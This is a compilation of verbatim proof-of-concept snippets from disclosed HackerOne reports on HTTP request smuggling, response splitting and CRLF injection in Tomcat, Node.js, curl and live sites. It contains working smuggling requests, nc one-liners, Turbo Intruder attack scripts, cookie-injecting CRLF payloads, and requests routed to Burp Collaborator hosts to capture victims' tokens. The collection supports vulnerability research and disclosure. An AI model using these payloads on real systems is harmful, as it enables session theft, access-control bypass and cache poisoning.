# HTTP request smuggling / response splitting — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #2280391 Possibility of Request smuggling attack — ibb — $4,660 — HTTP Request Smuggling
Source: `hackerone/reports/2023/2280391.md` (https://hackerone.com/reports/2280391)

```
$ git clone https://github.com/oss-aimoto/tomcat-trailer.git
$ cd tomcat-trailer
$ docker-compose build
$ docker-compose up -d
$ echo -n "testtrailer: " > 8190_EXCLUDE_COLON_SP_CR_LF.txt
$ for i in `seq 8179`; do echo -n "a"; done >> 8190_EXCLUDE_COLON_SP_CR_LF.txt
$ perl -e 'print "\r\n"' >> 8190_EXCLUDE_COLON_SP_CR_LF.txt
$ head -11 base.txt > attack5.txt
$ cat 8190_EXCLUDE_COLON_SP_CR_LF.txt >> attack5.txt
$ perl -e 'print "a: GET /examples/?this_is_attack HTTP/1.1\r\nHost: attack\r\n\r\n"' >> attack5.txt
$ cat attack5.txt | curl telnet://localhost:8082/ --output -
```

```
192.168.128.1 - - [23/Oct/2023:06:55:37 +0000] "POST /examples/test.jsp HTTP/1.1" 200 58
192.168.128.1 - - [23/Oct/2023:06:55:37 +0000] "GET /examples/?this_is_attack HTTP/1.1" 200 1126 
```

```
POST /examples/test.jsp HTTP/1.1
Host: www.example.co.jp
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Connection: KeepAlive

5
```

## #2327341 CVE-2024-21733 Apache Tomcat HTTP Request Smuggling (Client- Side Desync) (CWE: 444) — ibb — $4,660 — HTTP Request Smuggling
Source: `hackerone/reports/2024/2327341.md` (https://hackerone.com/reports/2327341)

```
POST / HTTP/1.1
Host: hostname
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: keep-alive
Content-Length: 6
Content-Type: application/x-www-form-urlencoded

X
```

## #2299692 Request Smuggling in Apache Tomcat (Important, CVE-2023-45648) — ibb — $4,660 — HTTP Request Smuggling
Source: `hackerone/reports/2024/2299692.md` (https://hackerone.com/reports/2299692)

```
POST /benign_path HTTP/1.1
Host: a.com
Connection: keep-alive
Transfer-Encoding: chunked

5
12345
0
Content: hello
a

POST /benign_path HTTP/1.1
Host: a.com
Connection: keep-alive
Content-Length: 37

GET /evil_path HTTP/1.1
Any: any
Host: b.com
```

```
docker run -d --name hrs_tomcat_11 -p 43022:8080 tomcat:10.1.13
echo -n 'POST /benign_path HTTP/1.1\r\nHost: a.com\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n5\r\n12345\r\n0\r\nContent: hello\r\na\r\n\r\nPOST /benign_path HTTP/1.1\r\nHost: a.com\r\nConnection: keep-alive\r\nContent-Length: 37\r\n\r\nGET /evil_path HTTP/1.1\r\nAny: any\r\nHost: b.com\r\n\r\n' | nc 127.0.0.1 43022
docker exec -it hrs_tomcat_11 /bin/sh -c "cat /usr/local/tomcat/logs/localhost*"
```

```
192.168.215.1 - - [30/Dec/2023:10:42:00 +0000] "POST /benign_path HTTP/1.1" 404 683
192.168.215.1 - - [30/Dec/2023:10:42:00 +0000] "GET /evil_path HTTP/1.1" 404 683
```

## #2032842 HTTP Request Smuggling via Empty headers separated by CR — ibb — $1,800 — HTTP Request Smuggling
Source: `hackerone/reports/2023/2032842.md` (https://hackerone.com/reports/2032842)

```
const http = require("http");
http
  .createServer((request, response) => {
    let body = [];
    request
      .on("error", (err) => {
        response.end("Request Error: " + err);
      })
      .on("data", (chunk) => {
        body.push(chunk);
      })
      .on("end", () => {
        body = Buffer.concat(body).toString();
        // log the body to stdout to catch the smuggled request
        console.log("Response");
        console.log(request.headers);
        console.log(body);
        console.log("---");
        response.on("error", (err) => {
          // log the body to stdout to catch the smuggled request
          response.end("Response Error: " + err);
        });
        response.end(
          "Body length: " + body.length.toString() + " Body: " + body
        );
      });
  })
  .listen(5000);
```

```
printf "POST / HTTP/1.1\r\n"\
             "Host: localhost:5000\r\n"\
             "X-Abc:\rxTransfer-Encoding: chunked\r\n"\
             "\r\n"\
             "1\r\n"\
             "A\r\n"\
             "0\r\n"\
             "\r\n" | nc localhost 5000
```

```
Response
{ host: 'localhost:5000', 'x-abc': '', 'transfer-encoding': 'chunked' }
A
---
```

## #2279572 HTTP Response Header Injection in shopify/pitchfork + Rack 3 — shopify — $800 — HTTP Response Splitting
Source: `hackerone/reports/2025/2279572.md` (https://hackerone.com/reports/2279572)

```
    def append_header(buf, key, value)
      case value
      when Array # Rack 3
        value.each { |v| buf << "#{key}: #{v}\r\n" }
      when /\n/ # Rack 2
        # avoiding blank, key-only cookies with /\n+/
        value.split(/\n+/).each { |v| buf << "#{key}: #{v}\r\n" }
      else
        buf << "#{key}: #{value}\r\n"
      end
    end
```

```
❯ ruby -v
ruby 3.2.2 (2023-03-30 revision e51014f9c0) [arm64-darwin22]

❯ cat Gemfile
# frozen_string_literal: true

source "https://rubygems.org"

gem 'pitchfork', '~> 0.10.0'%

❯ bundle install
=> install rack (3.0.8)
```

```
events {
    worker_connections  16;
}
http {
    server {
        listen 80;
        server_name localhost;

        location / {
            proxy_pass http://host.docker.internal:3000/;
            
            proxy_redirect off;
        }
    }
}
```

## #726773 HTTP Request Smuggling on https://labs.data.gov — gsa_bbp — $750 — HTTP Request Smuggling
Source: `hackerone/reports/2020/726773.md` (https://hackerone.com/reports/726773)

```
import re

def queueRequests(target, wordlists):

    # to use Burp's HTTP stack for upstream proxy rules etc, use engine=Engine.BURP
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )
    engine.start()

    prefix = '''POST /hopefully404 HTTP/1.1
Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1'''

    chunk_size = hex(len(prefix)).lstrip("0x")
    attack = target.req.replace('0\r\n\r\n', chunk_size+'\r\n'+prefix+'\r\n0\r\n\r\n')
    content_length = re.search('Content-Length: ([\d]+)', attack).group(1)
    attack = attack.replace('Content-Length: '+content_length, 'Content-length: '+str(int(content_length)+len(chunk_size)-3))
    engine.queue(attack)

    for i in range(14):
        engine.queue(target.req)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)
```

```
POST / HTTP/1.1
Host: labs.data.gov
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding : chunked

a2
POST /hopefully404 HTTP/1.1
Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

```
-snip
<script type='application/ld+json' class='yoast-schema-graph yoast-schema-graph--main'>{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/#website","url":"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/","name":"Data.gov","potentialAction":{"@type":"SearchAction","target":"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/?s={search_term_string}","query-input":"required name=search_term_string"}}]}</script>
<!-- / Yoast SEO plugin. -->

-snip-

<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/simple-tooltips/zebra_tooltips.css?ver=5.2.4">
<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/reset.min.css?ver=4.9.16">
<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/common.min.css?ver=4.9.16">
<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/tooltip.min.css?ver=4.9.16">
<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/wp/wp-includes/css/dist/block-library/style.min.css?ver=5.2.4">

-snip-

<a class="dropdown-toggle local-link" data-toggle="dropdown" data-target="#" href="https://o0p31lhhe946t0sns65oy
```

## #1878489 CRLF Injection in Nodejs ‘undici’ via host — ibb — $600 — CRLF Injection
Source: `hackerone/reports/2023/1878489.md` (https://hackerone.com/reports/1878489)

```
function processHeader (request, key, val) {
  if (val && (typeof val === 'object' && !Array.isArray(val))) {
    throw new InvalidArgumentError(`invalid ${key} header`)
  } else if (val === undefined) {
    return
  }

  if (
    request.host === null &&
    key.length === 4 &&
    key.toLowerCase() === 'host'
  ) {
    // Consumed by Client
    request.host = val // without headerCharRegex.exec(val)
  } else if (
    request.contentLength === null &&
...
```

```
import { request } from 'undici'

const unsanitizedContentTypeInput =  '12 \r\n\r\naaa:aaa'

const {
    statusCode,
    headers,
    trailers,
    body
} = await request('http://127.0.0.1:23333', {
    method: 'GET',
    headers: {
        'content-type': 'application/json',
        'host': unsanitizedContentTypeInput
    }
})

console.log('response received', statusCode)
console.log('headers', headers)

for await (const data of body) {
    console.log('data', data)
}

console.log('trailers', trailers)
```

```
    throw new InvalidArgumentError(`invalid ${key} header`)
```

## #66386 [www.*.myshopify.com] CRLF Injection — shopify — $500 — None
Source: `hackerone/reports/2015/66386.md` (https://hackerone.com/reports/66386)

```
HTTP/1.1 302 Moved Temporarily
...
Location: http://myshopify.com/xxcrlftest
Set-Cookie:test=test;domain=.myshopify.com;
```

## #1002188 Potential HTTP Request Smuggling in nodejs — nodejs — $250 — HTTP Request Smuggling
Source: `hackerone/reports/2021/1002188.md` (https://hackerone.com/reports/1002188)

```
global
 daemon
 maxconn 256

defaults
 mode http
 timeout connect 5000ms
 timeout client 50000ms
 timeout server 50000ms

frontend http-in
 bind *:80
 default_backend servers
 acl url_403 path_beg -i /flag
 http-request deny if url_403

backend servers
 server server1 127.0.0.1:8080 maxconn 32
```

```
var express = require('express');
var app = express();
var bodyParser = require('body-parser')

app.use(bodyParser())

app.get('/', function (req, res) {
    res.send('Hello World!');
});

app.get('/flag', function (req, res) {
    res.send('flag is 1a2b3c4d5e6f');
});

app.post('/', function (req, res) {
    res.send('Hello World!');
});

app.listen(8080, function () {
    console.log('Example app listening on port 8080!');
});
```

```
POST / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked
Transfer-Encoding: chunked-false

1
A
0

GET /flag HTTP/1.1
Host: 127.0.0.1
foo: x
```

## #1238709 HTTP Request Smuggling due to accepting space before colon — nodejs — $250 — HTTP Request Smuggling
Source: `hackerone/reports/2021/1238709.md` (https://hackerone.com/reports/1238709)

```
GET / HTTP/1.1
Host: localhost:5000
Content-Length : 5

hello
```

```
GET / HTTP/1.1
Host: localhost:5000
Content-Length : 23

GET / HTTP/1.1
Dummy: GET /smuggled HTTP/1.1
Host: localhost:5000
```

```
const http = require('http');

// https://nodejs.org/en/docs/guides/anatomy-of-an-http-transaction/

http.createServer((request, response) => {
  let body = [];
  request.on('error', (err) => {
    response.end("error while reading body: " + err)
}).on('data', (chunk) => {
    body.push(chunk);
}).on('end', () => {
    body = Buffer.concat(body).toString();

    response.on('error', (err) => {
        response.end("error while sending response: " + err)
    });

    response.end("Body length: " + body.length.toString() + " Body: " + body);
  });
}).listen(5000);
```

## #1238099 HTTP Request Smuggling due to ignoring chunk extensions — nodejs — $250 — HTTP Request Smuggling
Source: `hackerone/reports/2021/1238099.md` (https://hackerone.com/reports/1238099)

```
GET / HTTP/1.1
Host: localhost
Transfer-Encoding: chunked

5 ; a=b
hello
0
```

```
GET / HTTP/1.1
Host: localhost:8080
Transfer-Encoding: chunked

2 \nxx
4c
0

GET /admin HTTP/1.1
Host: localhost:8080
Transfer-Encoding: chunked

0
```

```
$ curl http://localhost:8081
INDEX
$ curl http://localhost:8081/admin
ADMIN
$ curl http://localhost:8081/forbidden
FORBIDDEN
```

## #2147132 Security bug https://bugzilla.mozilla.org/oauth/authorize - CRLF Header injection via "redirect_uri" parameter — mozilla — $200 — CRLF Injection
Source: `hackerone/reports/2023/2147132.md` (https://hackerone.com/reports/2147132)

```
HTTP/2 302
server: nginx
date: Tue, 21 Feb 2023 12:04:22 GMT
content-length: 0
content-security-policy: default-src 'self'; worker-src 'none'; connect-src 'self' https://product-details.mozilla.org https://www.google-analytics.com https://treeherder.mozilla.org/api/failurecount/ https://crash-stats.mozilla.org/api/SuperSearch/; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob: https://secure.gravatar.com; object-src 'none'; script-src 'self' 'nonce-kYhs2ysp5D5M1gt2i2uKTFaJyxLN8Qm7O112v7Vt6J4dWGrf' 'unsafe-inline' https://www.google-analytics.com; style-src 'self' 'unsafe-inline'; frame-src https://crash-stop-addon.herokuapp.com; frame-ancestors 'self'; form-action 'self' https://www.google.com/search https://github.com/login/oauth/authorize https://github.com/login https://phabricator.services.mozilla.com/ https://people.mozilla.org
location:
xxx: something?error=invalid_scope
referrer-policy: same-origin
strict-transport-security: max-age=31536000; includeSubDomains
strict-transport-security: max-age=31536000
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block
via: 1.1 google
alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
```

## #95981 Http Response Splitting - Validate link — deriv — $75 — None
Source: `hackerone/reports/2015/95981.md` (https://hackerone.com/reports/95981)

```
    Set-Cookie: verify_token=sometoken; expires=Wed, 28 Oct 2015 23:31:35 GMT; domain=.binary.com; path=/; secure
```

## #79552 [gratipay.com] CRLF Injection — gratipay — $40 — None
Source: `hackerone/reports/2015/79552.md` (https://hackerone.com/reports/79552)

```
http://gratipay.com/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
```

```
Location: https://gratipay.com/\r
Set-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;\r\n
```

```
<form id="csrf" action="https://gratipay.com/~fickov/statement.json" method="POST"> 
<input type="hidden" name="lang" value="en" /> 
<input type="hidden" name="content" value="CSRF&#95;TEST" /> 
<input type="hidden" name="csrf&#95;token" value="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" /> 
<input type="submit" value="Submit request" /> 
</form> 
<img src="http://gratipay.com/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;" onerror="csrf.submit()">
```

## #737140 Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies — slack — - — HTTP Request Smuggling
Source: `hackerone/reports/2020/737140.md` (https://hackerone.com/reports/737140)

```
GET / HTTP/1.1
Transfer-Encoding : chunked
Host: slackb.com
User-Agent: Smuggler/v1.0
Content-Length: 83

0

GET <URL> HTTP/1.1
X: X
```

```
GET / HTTP/1.1
Transfer-Encoding : chunked
Host: slackb.com
User-Agent: Smuggler/v1.0
Content-Length: 83

0
```

## #771666 Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com — eternal — - — HTTP Request Smuggling
Source: `hackerone/reports/2020/771666.md` (https://hackerone.com/reports/771666)

```
DELETE / HTTP/1.1
Transfer-Encoding:	chunked
Host: api.zomato.com
Content-Length: 51
User-Agent: Treasure/6.7

0

GET /some/other/endpoint HTTP/1.1
X-Ignore: X[STOP]
```

```
DELETE / HTTP/1.1
Transfer-Encoding:	chunked
Host: api.zomato.com
Content-Length: 91
User-Agent: Treasure/6.7

0

GET https://2psvzm9pf3hkuz2dptyimjaynptfh4.burpcollaborator.net/desync/ HTTP/1.1
X: X
```

```
DELETE / HTTP/1.1
Transfer-Encoding:	chunked
Host: api.zomato.com
Content-Length: 91
User-Agent: Treasure/6.7

0

GET https://**YOUR_COLLAB_URL**/desync/ HTTP/1.1
X: X
```

## #867952 HTTP request Smuggling — helium — - — HTTP Request Smuggling
Source: `hackerone/reports/2020/867952.md` (https://hackerone.com/reports/867952)

```
POST /api/sessions HTTP/1.1
Host: console.helium.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://console.helium.com/login
Content-Type: application/json
Content-Length: 109
DNT: 1
Connection: close
Cookie: __cfduid=dc0212a0b1dcc0fe5853ef4e6b6d669ff1588840067; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6ImJmZDVjNzFmLWVhMWUtNDlmZi1hZGYyLTNlYWY3OTBjNmU3YlIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU4ODg0MDA3NzA2MiwibGFzdEV2ZW50VGltZSI6MTU4ODg0MTg5MDk3NiwiZXZlbnRJZCI6NywiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjl9
Transfer-Encoding: chunked

39
{"session":{"email":"fdsfsd@fgd.jk","password":"sdfsdf"}}
00

GET / HTTP/1.1
Host: www.helium.com
foo: x
```

```
POST /api/sessions HTTP/1.1
Host: console.helium.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://console.helium.com/login
Content-Type: application/json
Content-Length: 109
DNT: 1
Connection: close
Cookie: __cfduid=dc0212a0b1dcc0fe5853ef4e6b6d669ff1588840067; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6ImJmZDVjNzFmLWVhMWUtNDlmZi1hZGYyLTNlYWY3OTBjNmU3YlIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU4ODg0MDA3NzA2MiwibGFzdEV2ZW50VGltZSI6MTU4ODg0MTg5MDk3NiwiZXZlbnRJZCI6NywiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjl9
Transfer-Encoding: chunked

39
```

```
GET / HTTP/1.1
Host: www.helium.com
foo: x
```

## #922597 HTTP Request Smuggling due to CR-to-Hyphen conversion — nodejs — - — HTTP Request Smuggling
Source: `hackerone/reports/2020/922597.md` (https://hackerone.com/reports/922597)

```
GET / HTTP/1.1
Host: www.example.com
Content[CR]Length: 42
Connection: Keep-Alive

GET /proxy_sees_this HTTP/1.1
```

## #712979 Creating malformed URLs via new line character in-between two URLs leads to misrepresented hyperlinks in Tweets/DMs — x — - — CRLF Injection
Source: `hackerone/reports/2020/712979.md` (https://hackerone.com/reports/712979)

```
fakewebsite.tw + %0d + itter.com
```

```
POST /1.1/dm/new.json HTTP/1.1
Host: api.twitter.com

text=fakewebsite.tw%0ditter.com&cards_platform=Web-12&include_cards=1&include_composer_source=true&include_ext_alt_text=true&include_reply_count=1&tweet_mode=extended&dm_users=false&include_groups=true&include_inbox_timelines=true&include_ext_media_color=true&conversation_id=██████&recipient_ids=false&request_id=&ext=mediaColor,altText,mediaStats,highlightedLabel,cameraMoment
```

## #753939 HTTP SMUGGLING EXPOSED HMAC/DOS  — magic-bbp — - — HTTP Request Smuggling
Source: `hackerone/reports/2020/753939.md` (https://hackerone.com/reports/753939)

```
GET /login HTTP/1.1
Host: dashboard.fortmatic.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://dashboard.fortmatic.com/
DNT: 1
Connection: keep-alive
Cookie: ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2217057bde-1957-4ee5-ab69-48f049e806f1%22
Upgrade-Insecure-Requests: 1
If-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
 Transfer-Encoding: chunked

0
```

```
HTTP/1.1 403 Forbidden
Content-Type: application/xml
Transfer-Encoding: chunked
Connection: close
Date: Sun, 08 Dec 2019 11:00:51 GMT
Server: AmazonS3
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
Content-Security-Policy: default-src 'self';style-src 'self' 'unsafe-inline'; frame-src https://*.fortmatic.com/ https://fortmatic.github.io/ blob: https://x2.fortmatic.com; img-src 'self' https://*.fortmatic.com/ https://fortmatic.github.io/ https://anima-uploads.s3.amazonaws.com/ https://www.google-analytics.com/ https://stats.g.doubleclick.net/ https://*.githubusercontent.com https://www.google.com/ data:; connect-src 'self' https://*.fortmatic.com/ https://api.segment.io/ https://api.mixpanel.com/ https://api.amplitude.com/; script-src 'self'  https://cdn.segment.com/ https://cdn.mxpnl.com/libs/mixpanel-2-latest.min.js https://www.google-analytics.com/analytics.js https://cdn.amplitude.com/; base-uri 'self';
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
X-Cache: Error from cloudfront
Via: 1.1 e2deefdf2f2c76b24ee4785b69116006.cloudfront.net (CloudFront)
X-Amz-Cf-Pop: ATL56-C3
X-Amz-Cf-Id: znmHV1cu6phenKt25Mwr0WtHOgrpgrR4FvReDNGyaA2t__4ZCGRdmA==

<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>SignatureDoesNotMatch</Code><Message>The request signature we calculated does not match the signature you provided. Check your key and signing method.</Message><AWSAcc
```

```
# if you edit this file, ensure you keep the line endings as CRLF or you'll have a bad time
import re

def queueRequests(target, wordlists):

    # to use Burp's HTTP stack for upstream proxy rules etc, use engine=Engine.BURP
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )
    engine.start()

    # This will prefix the victim's request. Edit it to achieve the desired effect.
    prefix = '''GET / HTTP/1.1
Host: x2.fortmatic.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1'''

    chunk_size = hex(len(prefix)).lstrip("0x")
    attack = target.req.replace('0\r\n\r\n', chunk_size+'\r\n'+prefix+'\r\n0\r\n\r\n')
    content_length = re.search('Content-Length: ([\d]+)', attack).group(1)
    attack = attack.replace('Content-Length: '+content_length, 'Content-length: '+str(int(content_length)+len(chunk_size)-3))
    engine.queue(attack)

    for i in range(1400):
        engine.queue(target.req)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)
```

## #965267 Potential HTTP Request Smuggling in ruby webrick — ruby — - — HTTP Request Smuggling
Source: `hackerone/reports/2020/965267.md` (https://hackerone.com/reports/965267)

```
that is not rigorous. When using webrick as a http server, a attacker may use  a 
```

```
      return unless socket
      if tc = self['transfer-encoding']
        case tc
        when /chunked/io then read_chunked(socket, block)
        else raise HTTPStatus::NotImplemented, "Transfer-Encoding: #{tc}."
        end
      elsif self['content-length'] || @remaining_size
        @remaining_size ||= self['content-length'].to_i
        while @remaining_size > 0
          sz = [@buffer_size, @remaining_size].min
          break unless buf = read_data(socket, sz)
          @remaining_size -= buf.bytesize
          block.call(buf)
        end
        if @remaining_size > 0 && @socket.eof?
          raise HTTPStatus::BadRequest, "invalid body size."
        end
      elsif BODY_CONTAINABLE_METHODS.member?(@request_method)
        raise HTTPStatus::LengthRequired
      end
      return @body
    end
```

## #3723248 HTTP Request Smuggling via Connection: close<TAB> in Node.js llhttp parser — nodejs — - — HTTP Request Smuggling
Source: `hackerone/reports/2026/3723248.md` (https://hackerone.com/reports/3723248)

```
node -e "require('http').createServer((req,res)=>{console.log('request:', req.url); req.resume(); res.end('ok');}).listen(8080,'127.0.0.1',()=>console.log('listening'))"
```

```
printf 'POST /first HTTP/1.1\r\nHost: victim\r\nContent-Length: 4\r\nConnection: close\r\n\r\n1234GET /smuggled HTTP/1.1\r\nHost: victim\r\n\r\n' | nc -w 2 127.0.0.1 8080
```

```
printf 'POST /first HTTP/1.1\r\nHost: victim\r\nContent-Length: 4\r\nConnection: close \r\n\r\n1234GET /smuggled HTTP/1.1\r\nHost: victim\r\n\r\n' | nc -w 2 127.0.0.1 8080
```

## #409943 Http request splitting — nodejs — - — HTTP Response Splitting
Source: `hackerone/reports/2020/409943.md` (https://hackerone.com/reports/409943)

```
const http = require('http')

const server = http.createServer((req, res) => {
  console.log(req.url);
  res.end();
});

server.listen(8000, function() {
  http.get('http://127.0.0.1:8000/?param=x\u{0120}HTTP/1.1\u{010D}\u{010A}Host:{\u0120}127.0.0.1:8000\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private', function() {
  });
});
```

## #3133379 CRLF Injection in `--proxy-header` allows extra HTTP headers (CWE-93) — curl — - — CRLF Injection
Source: `hackerone/reports/2025/3133379.md` (https://hackerone.com/reports/3133379)

```
--proxy-header $'X-Test: hello\r\nX-Evil: owned'
```

```
X-Test: hello
X-Evil: owned
```

```
int main(int argc, char *argv[])
```

## #1120982 HTTP Request Smuggling  — deptofdefense — - — HTTP Request Smuggling
Source: `hackerone/reports/2021/1120982.md` (https://hackerone.com/reports/1120982)

```
GET /404 HTTP/1.1
Host: www.███████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
███████
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 118
Connection: keep-alive

0

GET https://www.███████/███ HTTP/1.1
Host: www.█████████
foo: x
```

```
HTTP/1.1 302 Found
Date: Tue, 09 Mar 2021 02:54:22 GMT
Server: Apache
Set-Cookie: ███=expiry=1615259062417257;Max-Age=600;path=/;httponly;secure;
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin
Location: https://www.████/404_not_found.html
Content-Length: 236
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="https://www.████████/404_not_found.html">here</a>.</p>
</body></html>
HTTP/1.1 200 OK
Date: Tue, 09 Mar 2021 02:54:22 GMT
Server: Apache
Set-Cookie: ████████=expiry=1615259062417962;Max-Age=600;path=/;httponly;secure;
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin
Cache-Control: no-cache, private
Last-Modified: Mon, 05 Mar 2012 16:45:37 GMT
ETag: "78d0-4ba81a7e20e40"
Accept-Ranges: bytes
Content-Length: 30928
Content-Type: image/png

PNG

```

```
GET /404 HTTP/1.1
Host: www.███████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
███████
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 118
Connection: keep-alive

0
```

## #3516974 SSL options ISSUERCERT, EC_CURVES and CRLFILE silently ignored by non-OpenSSL backends — curl — - — Missing Required Cryptographic Step
Source: `hackerone/reports/2026/3516974.md` (https://hackerone.com/reports/3516974)

```
=== mbedTLS ===
===========================================
curl 8.19.0-DEV (mbedTLS/4.0.0)
===========================================

--- CURLOPT_ISSUERCERT ---
  Setting: "fake_issuer.pem"
  setopt: No error
  perform: No error
  Result: VULNERABLE - silently ignored!

--- CURLOPT_SSL_EC_CURVES ---
  Setting: "INVALID_CURVE_NAME"
  setopt: No error
  perform: No error
  Result: VULNERABLE - silently ignored!

--- CURLOPT_CRLFILE ---
  Setting: "fake_crl.pem"
  setopt: No error
  perform: Failed to load CRL file (path? access rights?, format?)
  Result: CORRECT - CRL check enforced

===========================================
SUMMARY
===========================================
  CURLOPT_ISSUERCERT        VULNERABLE
  CURLOPT_SSL_EC_CURVES     VULNERABLE
  CURLOPT_CRLFILE           OK

FOUND 2 VULNERABILITIES

=== OpenSSL ===
===========================================
curl 8.19.0-DEV (OpenSSL/3.0.13)
